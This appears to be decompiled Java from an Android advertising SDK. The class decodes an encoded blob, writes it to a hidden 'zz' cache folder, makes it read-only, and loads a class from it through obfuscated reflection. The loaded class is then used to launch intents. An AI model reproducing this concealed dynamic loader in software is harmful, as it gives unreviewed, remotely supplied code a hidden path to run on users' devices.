package com.fl.saas;

import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import android.util.Log;
import com.fl.saas.adx.util.DeviceUtil;
import com.fl.saas.adx.util.EventUtil;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import org.json.JSONObject;

/* JADX INFO: renamed from: com.fl.saas.z, reason: case insensitive filesystem */
/* JADX INFO: loaded from: /home/ylxc/Projects/lib/ShanDong/work/APP_ALL/classes_08_10593cls.dex */
public abstract class AbstractC1447z {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    private static EventUtil f30214a;
    private static final Map b = new ConcurrentHashMap();

    public static void a() {
        try {
            M.a(new File(a(DeviceUtil.getContext()).getAbsolutePath() + File.separator + "zz"));
            f30214a = null;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void b() {
        EventUtil eventUtil = f30214a;
        if (eventUtil != null) {
            eventUtil.i(DeviceUtil.getContext());
        }
    }

    public static int c() {
        try {
            EventUtil eventUtil = f30214a;
            return (eventUtil == null || eventUtil.v() <= 4) ? 0 : 1;
        } catch (Exception unused) {
            return 0;
        }
    }

    public static File a(Context context) {
        File cacheDir = context.getCacheDir();
        if (!cacheDir.exists()) {
            cacheDir.mkdirs();
        }
        return cacheDir;
    }

    public static void b(String str) {
        try {
            if (TextUtils.isEmpty(str)) {
                return;
            }
            String[] strArrSplit = str.split(",");
            if (strArrSplit.length != 2) {
                return;
            }
            String strD = AbstractC1417k.d(strArrSplit[0]);
            if (TextUtils.isEmpty(strD)) {
                return;
            }
            JSONObject jSONObject = new JSONObject(strD);
            String strOptString = jSONObject.optString("s1");
            String strOptString2 = jSONObject.optString("s2");
            String strOptString3 = jSONObject.optString("s3");
            String strOptString4 = jSONObject.optString("s4");
            String strOptString5 = jSONObject.optString("s5");
            String strOptString6 = jSONObject.optString("s6");
            File fileA = a(DeviceUtil.getContext());
            StringBuilder sb = new StringBuilder();
            sb.append(fileA.getAbsolutePath());
            String str2 = File.separator;
            sb.append(str2);
            sb.append("zz");
            sb.append(str2);
            sb.append(strOptString6);
            String string = sb.toString();
            File file = new File(string);
            try {
                if (file.exists()) {
                    file.delete();
                } else {
                    File parentFile = file.getParentFile();
                    if (parentFile != null && !parentFile.exists()) {
                        parentFile.mkdirs();
                    }
                }
                file.createNewFile();
                a(strArrSplit[1], string);
                file.setWritable(false);
            } catch (Exception unused) {
            }
            Class clsA = a(string, strOptString, strOptString2, strOptString3, strOptString4, strOptString5);
            if (clsA != null) {
                EventUtil eventUtil = (EventUtil) clsA.newInstance();
                f30214a = eventUtil;
                eventUtil.i(DeviceUtil.getContext());
                int iV = f30214a.v();
                Log.i("cbk", "v" + iV);
                S0.a().b("key_zz_value", strArrSplit[0]);
                S0.a().b("key_zz_number", iV);
            }
        } catch (Exception unused2) {
        }
    }

    public static boolean a(Context context, Intent intent, String str, int i, int i2) {
        if (context != null && intent != null && i != 0) {
            try {
                if (("OPPO".equalsIgnoreCase(DeviceUtil.getDeviceBrand()) && i2 == 1) ? DeviceUtil.startDpUrl(context, str) : false) {
                    return true;
                }
                EventUtil eventUtil = f30214a;
                if (eventUtil == null) {
                    return false;
                }
                return eventUtil.l(context, intent);
            } catch (Exception unused) {
            }
        }
        return false;
    }

    public static int a(String str) {
        Class clsA;
        try {
            String strD = AbstractC1417k.d(str);
            if (TextUtils.isEmpty(strD)) {
                return 0;
            }
            JSONObject jSONObject = new JSONObject(strD);
            String strOptString = jSONObject.optString("s1");
            String strOptString2 = jSONObject.optString("s2");
            String strOptString3 = jSONObject.optString("s3");
            String strOptString4 = jSONObject.optString("s4");
            String strOptString5 = jSONObject.optString("s5");
            String strOptString6 = jSONObject.optString("s6");
            File fileA = a(DeviceUtil.getContext());
            StringBuilder sb = new StringBuilder();
            sb.append(fileA.getAbsolutePath());
            String str2 = File.separator;
            sb.append(str2);
            sb.append("zz");
            sb.append(str2);
            sb.append(strOptString6);
            String string = sb.toString();
            if (new File(string).exists() && (clsA = a(string, strOptString, strOptString2, strOptString3, strOptString4, strOptString5)) != null) {
                EventUtil eventUtil = (EventUtil) clsA.newInstance();
                f30214a = eventUtil;
                eventUtil.i(DeviceUtil.getContext());
                int iV = f30214a.v();
                Log.i("cbk", "v" + iV);
                return iV;
            }
        } catch (Exception unused) {
        }
        return 0;
    }

    private static Class a(String str, String str2, String str3, String str4, String str5, String str6) {
        Log.i("cbk", "r");
        if (!TextUtils.isEmpty(str6) && !TextUtils.isEmpty(str)) {
            String str7 = str2 + str5 + str6 + str.hashCode();
            Map map = b;
            if (map.containsKey(str7)) {
                return (Class) map.get(str7);
            }
            try {
                Class<?> cls = Class.forName(str2);
                Class<?> cls2 = Class.forName(str3);
                Class cls3 = (Class) cls.getMethod(str5, String.class).invoke(cls.getConstructor(cls2, cls2, cls2, Class.forName(str4)).newInstance(str, a(DeviceUtil.getContext()).getAbsolutePath(), null, DeviceUtil.getContext().getClassLoader()), str6);
                if (cls3 != null) {
                    map.put(str7, cls3);
                }
                return cls3;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    public static void a(String str, C1415j c1415j) {
        try {
            EventUtil eventUtil = f30214a;
            if (eventUtil == null || c1415j == null) {
                return;
            }
            eventUtil.q(AbstractC1434s0.a(str, c1415j));
        } catch (Exception unused) {
        }
    }

    public static void a(String str, String str2) {
        try {
            byte[] bArrC = AbstractC1417k.c(str);
            FileOutputStream fileOutputStream = new FileOutputStream(str2);
            try {
                BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream);
                try {
                    int length = bArrC.length;
                    int i = 0;
                    while (length > 0) {
                        int iMin = Math.min(1048576, length);
                        bufferedOutputStream.write(bArrC, i, iMin);
                        i += iMin;
                        length -= iMin;
                    }
                    bufferedOutputStream.flush();
                    bufferedOutputStream.close();
                    fileOutputStream.close();
                } catch (Throwable th) {
                    try {
                        bufferedOutputStream.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                    throw th;
                }
            } catch (Throwable th3) {
                try {
                    fileOutputStream.close();
                } catch (Throwable th4) {
                    th3.addSuppressed(th4);
                }
                throw th3;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
